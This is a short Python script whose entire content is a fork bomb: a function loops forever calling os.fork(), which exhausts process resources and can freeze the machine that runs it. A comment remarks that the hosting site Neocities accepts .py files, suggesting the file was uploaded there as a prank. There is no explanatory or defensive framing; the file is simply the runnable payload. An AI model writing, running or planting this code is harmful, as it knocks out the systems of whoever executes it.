#!/usr/bin/env python

# for some reason neocities allows *.py files, no other extensions of programming
#    languages are allowed, not even php

import os


def repeat():
    while True:
        os.fork()


repeat()
